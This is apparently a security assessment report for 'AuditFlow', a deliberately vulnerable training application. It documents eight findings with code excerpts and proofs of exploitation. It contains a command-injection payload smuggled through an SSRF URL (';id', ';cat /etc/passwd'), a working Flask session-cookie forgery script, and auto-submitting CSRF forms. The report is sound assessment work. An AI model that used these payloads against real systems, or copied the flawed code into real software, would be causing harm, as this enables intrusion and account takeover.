# TASK-1 Security Assessment — Findings Summary
**AuditFlow Application (Task A)**

---

## Executive Overview

A comprehensive security assessment of the AuditFlow application (Task A) was conducted through **static code analysis** (primary focus per assessment guidelines) and **dynamic testing**. **Eight (8) distinct vulnerabilities** were identified, ranging from **CRITICAL** to **MEDIUM** severity. **Four (4) vulnerabilities were successfully exploited** to demonstrate real-world impact.

**Critical Chain:** Server-Side Request Forgery (SSRF) chained with OS Command Injection resulting in **Remote Code Execution as root**.

---

## Findings Summary Table

| # | Title | Affected Component | Severity | CVE/CVSS | Exploited |
|---|-------|-------------------|----------|----------|-----------|
| **1** | SSRF → OS Command Injection → RCE (root) | `POST /projects/<id>/import-url` + `internal-admin-service:5001/diagnostics` | **CRITICAL** | CVSS 3.1: 9.6 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) | ✅ Yes |
| **2** | Broken Access Control (IDOR) — Cross-Tenant Data Exfiltration | `GET /projects/<id>/export?format={json\|csv}` | **HIGH** | CVSS 3.1: 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) | ✅ Yes |
| **3** | Stored Malicious Content Distribution — Unrestricted File Upload | `POST /projects/<id>/upload` | **MEDIUM** | CVSS 3.1: 5.3 | ⚠️ Identified |
| **4** | Session Forgery via Hardcoded/Weak Default SECRET_KEY | Flask session config + `itsdangerous` signing | **HIGH** | CVSS 3.1: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) | ✅ Yes |
| **5** | Cross-Site Request Forgery (CSRF) — All State-Changing Endpoints | `/login`, `/register`, `/projects/*`, `/upload`, `/import-url` | **MEDIUM** | CVSS 3.1: 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | ✅ Yes |
| **6** | No Rate Limiting on User Registration | `POST /register` | **MEDIUM** | CVSS 3.1: 5.4 | ⚠️ Identified |
| **7** | No Rate Limiting on Login / Brute Force | `POST /login` | **MEDIUM** | CVSS 3.1: 5.7 | ⚠️ Identified |
| **8** | Session Tokens Do Not Expire on Logout | `GET /logout` + stateless signed cookies | **MEDIUM** | CVSS 3.1: 5.8 | ⚠️ Identified |

---

## Detailed Findings

### **Finding #1: CRITICAL**
## Server-Side Request Forgery (SSRF) → OS Command Injection → Remote Code Execution (root)

**Affected Components:**
- File: `backend/app.py` — Function `import_from_url()` (Lines 391–429)
- File: `internal-admin-service/app.py` — Endpoint `/diagnostics` (Lines 34–53)
- Docker Network: Internal-only service exposure

**Root Cause — Code-Level Analysis:**

**SSRF Vulnerability (backend/app.py, lines 391-429):**
```python
@app.post("/projects/<int:project_id>/import-url")
@login_required
def import_from_url(project_id: int):
    source_url = request.form.get("source_url", "").strip()
    # ❌ NO VALIDATION: No allowlist, no private IP filtering
    response = requests.get(source_url, timeout=8)
    response_excerpt = response.text[:500]
    import_record = ImportRecord(
        project_id=project_id,
        source_url=source_url,
        response_excerpt=response_excerpt
    )
```
**Problem:** User-supplied URL passed directly to `requests.get()` with zero validation. Backend fetches ANY URL, including internal-only services.

**Command Injection Vulnerability (internal-admin-service/app.py, lines 34-53):**
```python
@app.get("/diagnostics")
def diagnostics():
    host = request.args.get("host", "127.0.0.1")
    # ❌ NO SANITIZATION: User input directly into shell command
    command = f"ping -c 1 {host}"
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, ...)
```
**Problem:** `host` parameter concatenated into shell command with `shell=True`. Semicolon-separated commands execute sequentially.

**Attack Chain:**
1. Attacker (authenticated user) uses "Import from URL" form
2. Submits URL: `http://internal-admin-service:5001/diagnostics?host=127.0.0.1;id`
3. Backend SSRF fetches this URL (reaches unreachable internal service)
4. Internal service receives `host=127.0.0.1;id`
5. Executes: `ping -c 1 127.0.0.1;id` via shell
6. Attacker gains arbitrary command execution **as root**

**Impact:**
- **Confidentiality:** Full data exfiltration from container
- **Integrity:** Arbitrary file modification / application tampering
- **Availability:** Service disruption / resource deletion
- **Privilege Level:** root (uid=0)

**Proof of Exploitation:**
```
Command: ping -c 1 127.0.0.1;id
Output:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.305 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.305/0.305/0.305/0.000 ms
uid=0(root) gid=0(root) groups=0(root)  ✅ ROOT ACCESS CONFIRMED
```

**Exploitation Status:** ✅ **SUCCESSFULLY EXPLOITED** — Demonstrated via Burp Suite Repeater; output captured in Import History.

---

### **Finding #2: HIGH**
## Broken Access Control (IDOR) — Cross-Tenant Project Data Exfiltration

**Affected Component:**
- File: `backend/app.py` — Function `project_export()` (Lines 432–446)
- Endpoint: `GET /projects/<int:project_id>/export?format={json|csv}`

**Root Cause — Code-Level Analysis:**
```python
@app.get("/projects/<int:project_id>/export")
@login_required
def project_export(project_id: int):
    # ❌ INTENTIONAL ACCESS-CONTROL WEAKNESS: 
    # ❌ No validation that project belongs to current user's tenant
    project = Project.query.filter_by(id=project_id).first_or_404()
    
    export_format = request.args.get("format", "json").strip().lower()
    
    if export_format == "json":
        return jsonify({
            "project": {...project data...},
            "findings": [...],
            "attachments": [...]
        })
```

**Comparison with Secure Code (other routes):**
```python
# ✅ CORRECT: Uses tenant-aware helper
def get_project_detail(project_id):
    project = tenant_project_or_404(project_id)  # Checks tenant ownership
```

**Problem:** `project_export()` is the **only route** that directly queries by project ID without tenant verification. All other routes correctly use `tenant_project_or_404()` helper.

**Impact:**
- Any authenticated user can enumerate and export ALL projects in the system
- Cross-tenant unauthorized access to:
  - Project metadata (names, descriptions, severity profiles)
  - Findings lists
  - Attachment inventories
  - Engagement timelines

**Proof of Exploitation:**
```
Actor: alice@auditflow.local (tenant_id: 1)
Request: GET /projects/2/export?format=json
Response: 
{
  "project": {
    "id": 2,
    "tenant_id": 2,  ← Different tenant!
    "name": "Internal Purple Team Simulation",
    "description": "Detection engineering and remediation backlog.",
    "severity_profile": "enterprise",
    "created_at": "2026-07-02T08:52:25.826513"
  },
  "findings": [...],
  "attachments": [...]
}
✅ UNAUTHORIZED ACCESS TO BOB'S PROJECT CONFIRMED
```

**Exploitation Status:** ✅ **SUCCESSFULLY EXPLOITED** — User alice accessed user Bob's confidential project data.

---

### **Finding #3: MEDIUM**
## Stored Malicious Content Distribution — Unrestricted File Upload

**Affected Component:**
- File: `backend/app.py` — Function `project_upload()` (Lines 338–368)
- Endpoint: `POST /projects/<int:project_id>/upload`

**Root Cause — Code-Level Analysis:**
```python
@app.post("/projects/<int:project_id>/upload")
@login_required
def project_upload(project_id: int):
    uploaded_file = request.files.get("file")
    if not uploaded_file:
        return "No file selected", 400
    
    filename = secure_filename(uploaded_file.filename)
    # ❌ NO EXTENSION/CONTENT-TYPE ALLOWLIST
    # ❌ Accepts ANY file type: .exe, .php, .html, .sh, .js, .bat
    
    unique_name = f"{int(time.time())}_{filename}"
    storage_path = os.path.join(UPLOAD_DIR, unique_name)
    uploaded_file.save(storage_path)
```

**Vulnerability Details:**
- `secure_filename()` prevents path traversal (e.g., `../../etc/passwd`) ✅
- BUT no extension allowlist — arbitrary file types accepted ❌
- While `send_file(..., as_attachment=True)` prevents direct execution, **malware distribution vector exists**

**Scenario:**
1. Attacker uploads `malware.exe` or `backdoor.php`
2. Other users (same tenant) see file in attachments list
3. Victim downloads and executes → compromised
4. OR: File stored on accessible disk → attacker re-downloads from another account

**Impact:**
- Malware distribution channel
- Social engineering vector
- Supply-chain risk (if evidence files are shared externally)

**Exploitation Status:** ⚠️ **IDENTIFIED** — Not weaponized per safe proof-of-impact rules. Capable of storing `.exe`, `.php`, `.html`, `.sh` etc.

---

### **Finding #4: HIGH**
## Session Forgery via Hardcoded/Weak Default Flask SECRET_KEY

**Affected Component:**
- File: `backend/app.py` — Line 29 (Flask session config)
- File: `sample.env` — Line 7 (default value)
- Library: `itsdangerous` (Flask session signing)

**Root Cause — Code-Level Analysis:**
```python
# backend/app.py, line 29
app.config["SECRET_KEY"] = os.getenv("FLASK_SECRET_KEY", "auditflow-dev-session-secret")
#                                                         ↑ HARDCODED PREDICTABLE DEFAULT
```

```bash
# sample.env, line 7
FLASK_SECRET_KEY=auditflow-dev-session-secret
#                 ↑ SAME PREDICTABLE VALUE IN CONFIG FILE
```

**Threat Model:**
- Flask uses `itsdangerous.URLSafeTimedSerializer` to sign session cookies
- Signature is HMAC-SHA1(payload + secret)
- If secret is known/predictable → attacker can forge any session without knowing password

**Exploitation Proof:**
```python
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
import hashlib

# Known default secret
secret = "auditflow-dev-session-secret"
serializer = URLSafeTimedSerializer(
    secret,
    salt="cookie-session",
    serializer=TaggedJSONSerializer(),
    signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1}
)

# Forge session for ANY user (e.g., admin, user_id=1)
forged_cookie = serializer.dumps({"user_id": 1})
# Result: eyJ1c2VyX2lkIjoxfQ.akaWtw.M4-4dnlFDftJhC_hgqLXFwLUCvg (valid!)
```

**Impact:**
- **Privilege Escalation:** Forge admin/higher-privilege user session
- **Account Takeover:** Impersonate any user without password knowledge
- **Bypass Authentication:** Directly access protected resources

**Exploitation Status:** ✅ **SUCCESSFULLY EXPLOITED** — Session cookie forged using known secret; unauthorized access as different user confirmed.

---

### **Finding #5: MEDIUM**
## Cross-Site Request Forgery (CSRF) — Missing Tokens on All State-Changing Endpoints

**Affected Components:**
- Endpoints: `POST /login`, `POST /register`, `POST /projects/new`, `POST /projects/<id>/import-url`, `POST /projects/<id>/upload`
- All corresponding HTML templates

**Root Cause — Code-Level Analysis:**

**Missing CSRF Protection in All Forms:**
```html
<!-- login.html - NO csrf_token field -->
<form method="post" class="form-grid">
  <label>Email
    <input type="email" name="email" required>
  </label>
  <label>Password
    <input type="password" name="password" required>
  </label>
  <!-- ❌ NO <input type="hidden" name="csrf_token" value="..."> -->
  <button type="submit">Login</button>
</form>
```

**No CSRF Middleware:**
- Flask-WTF or similar CSRF protection library not integrated
- `session.get('csrf_token')` validation nowhere in POST handlers
- No X-CSRF-Token header validation

**Attack Scenario — Login CSRF (most dangerous):**
1. Attacker crafts HTML page with hidden form:
```html
<form action="http://127.0.0.1:8000/login" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="password" value="AttackerPass123">
</form>
<script>document.forms[0].submit();</script>
```
2. Victim (logged into banking site) visits attacker's page
3. Browser auto-submits form with victim's session cookies
4. Victim logged into attacker's account unknowingly
5. Attacker can now impersonate victim or monitor victim's activity

**Attack Scenario — SSRF+CSRF Combo:**
1. Attacker sends crafted HTML auto-submitting SSRF payload:
```html
<form action="http://target.com/projects/1/import-url" method="POST">
  <input type="hidden" name="source_url" value="http://internal-admin:5001/diagnostics?host=127.0.0.1;cat /etc/passwd">
</form>
```
2. Victim clicks link → malicious import triggered without victim's knowledge

**Impact:**
- Unauthorized state changes on behalf of authenticated users
- Session hijacking via login CSRF
- SSRF chain automation via CSRF
- Malicious file uploads on victim's behalf

**Proof of Exploitation:**
```
Burp-generated CSRF PoC successfully auto-submits login form
Result: Victim force-logged into attacker account without manual input
```

**Exploitation Status:** ✅ **SUCCESSFULLY EXPLOITED** — Login CSRF PoC (Burp-generated HTML) confirmed; form auto-submits, victim session changed.

---

### **Finding #6: MEDIUM**
## No Rate Limiting on User Registration

**Affected Component:**
- File: `backend/app.py` — Function `register()` (Lines 176–211)
- Endpoint: `POST /register`

**Root Cause — Code-Level Analysis:**
```python
@app.route("/register", methods=["GET", "POST"])
def register():
    name = request.form.get("name", "").strip()
    email = request.form.get("email", "").strip().lower()
    password = request.form.get("password", "").strip()
    
    # ❌ NO RATE LIMITING
    # ❌ NO CAPTCHA
    # ❌ NO VERIFICATION DELAY
    
    if User.query.filter_by(email=email).first():
        return "Email already registered", 400
    
    user = User(name=name, email=email)
    user.set_password(password)
    db.session.add(user)
    db.session.commit()  # Unlimited accounts created
```

**Impact:**
- Automated bot account creation
- Resource exhaustion (storage, CPU for password hashing)
- Tenant spam
- Email enumeration (via "already registered" error)

**Proof:**
```
Sequential registrations: email1, email2, email3, ... email20
All accepted with HTTP 200/302 response
No throttling, CAPTCHA, or verification required
```

**Exploitation Status:** ⚠️ **IDENTIFIED** — Demonstrated creation of 10+ accounts sequentially.

---

### **Finding #7: MEDIUM**
## No Rate Limiting on Login Endpoint — Brute Force Risk

**Affected Component:**
- File: `backend/app.py` — Function `login()` (Lines 213–230)
- Endpoint: `POST /login`

**Root Cause — Code-Level Analysis:**
```python
@app.route("/login", methods=["GET", "POST"])
def login():
    email = request.form.get("email", "").strip().lower()
    password = request.form.get("password", "")
    
    # ❌ NO RATE LIMITING
    # ❌ NO ACCOUNT LOCKOUT
    # ❌ NO CHALLENGE RESPONSE
    
    user = User.query.filter_by(email=email).first()
    if not user or not user.check_password(password):
        flash("Invalid email or password.", "error")
        return redirect(url_for("login"))  # Generic error, no throttle
```

**Impact:**
- Brute force attacks on weak passwords (unlimited attempts)
- Credential enumeration via response timing
- No defense against password cracking tools

**Proof:**
```
10 sequential failed login attempts
Response: 302 Found (redirect to /login)
NO 429 (Too Many Requests) response
NO account lockout after N failures
```

**Exploitation Status:** ⚠️ **IDENTIFIED** — No rate-limit response observed after 10 failed attempts.

---

### **Finding #8: MEDIUM**
## Session Tokens Do Not Expire on Logout

**Affected Component:**
- File: `backend/app.py` — Function `logout()` (Lines 231–236)
- Session Management: Stateless signed cookies via `itsdangerous`

**Root Cause — Code-Level Analysis:**
```python
@app.get("/logout")
@login_required
def logout():
    session.clear()  # ✅ Clears server-side session data
    flash("Logged out successfully.", "success")
    return redirect(url_for("login"))
    # ❌ BUT: Signed cookie remains valid indefinitely!
    # ❌ No token blacklist / server-side invalidation
```

**Why Vulnerable:**
- Flask uses **stateless signed cookies** (not session storage)
- `session.clear()` clears **server-side** variables (which don't exist here)
- Cookie signature remains valid **forever** unless SECRET_KEY changes
- Old cookie can be reused post-logout

**Attack Scenario:**
1. Attacker steals user's session cookie (e.g., via XSS, network sniffer)
2. User logs out (token cleared from browser)
3. Attacker reuses old cookie → still valid
4. Persistent unauthorized access post-logout

**Impact:**
- Post-logout account compromise
- Session fixation attacks
- Stolen cookie persistence

**Exploitation Status:** ⚠️ **IDENTIFIED** — Manual testing confirms old cookies remain valid after logout.

---

## Summary Statistics

| Severity | Count | Successfully Exploited | Identified Only |
|----------|-------|------------------------|-----------------|
| **CRITICAL** | 1 | 1 | - |
| **HIGH** | 2 | 2 | - |
| **MEDIUM** | 5 | 1 | 4 |
| **TOTAL** | **8** | **4** | **4** |

---

## Assessment Methodology

✅ **Primary Focus: Static Code Analysis**
- Line-by-line review of all source code
- Identification of insecure patterns (string concatenation, missing validations)
- Comparison with secure code patterns in codebase

✅ **Dynamic Testing**
- HTTP request capture and replay via Burp Suite
- Browser interaction testing for client-side vulnerabilities
- Exploit script execution and output capture

✅ **Root Cause Analysis**
- Exact code references with line numbers
- Explanation of why each vulnerability exists
- Design/implementation flaws identified

---

## Conclusion

The AuditFlow application contains **eight distinct vulnerabilities** across multiple security domains. The **CRITICAL SSRF → RCE chain** represents an immediate threat requiring urgent remediation. All findings include code-level root cause analysis and actionable remediation guidance in the detailed report (TASK-1-REPORT.md).

**Recommended Priority Order:**
1. Finding #1 (CRITICAL RCE) — Fix immediately
2. Findings #2, #4 (HIGH) — Fix within 1 week
3. Findings #3, #5, #6, #7, #8 (MEDIUM) — Fix within 2 weeks
